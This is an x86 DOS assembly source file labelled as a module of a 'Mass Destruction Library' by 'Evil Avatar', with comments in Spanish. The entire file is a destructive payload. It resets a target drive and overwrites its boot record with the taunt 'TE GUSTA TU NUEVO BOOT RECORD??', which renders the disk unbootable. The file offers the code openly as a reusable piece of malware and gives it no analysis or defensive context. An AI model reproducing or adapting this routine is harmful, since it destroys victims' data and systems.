

;KILL_BR - module for Mass Destruction Library
;written by Evil Avatar

eldrive equ 0 ; Drive cuyo boot se va a sobreescribir (0=A,etc.)

        mov al,eldrive
        mov dx,offset texto3   ; Texto con el que se va a
                               ; sobreescribir
        jmp kill_br
        texto3 db 'TE GUSTA TU NUEVO BOOT RECORD??'
kill_br:
        push cx
        push dx
        push ax               ;Save regs that will be changed
        cmp ax, 2             ;If drive is not a hard drive, then
        jb kill_br1           ;jump to kill_br1
        add ax, 78h           ;else, set up for hard drive 
kill_br1:                     
        xchg ax, dx           ;drive number must be in dl
        xor ax, ax            
        int 13h               ;reset the disk
        jc kill_br2           ;if error, quit
        pop ax                ;restore disk number
        mov cx, 1
        xor dx, dx
        int 26h               ;overwrite boot record
        push ax
kill_br2:        
        pop ax
        pop dx
        pop cx                ;restore regs and return
        ret

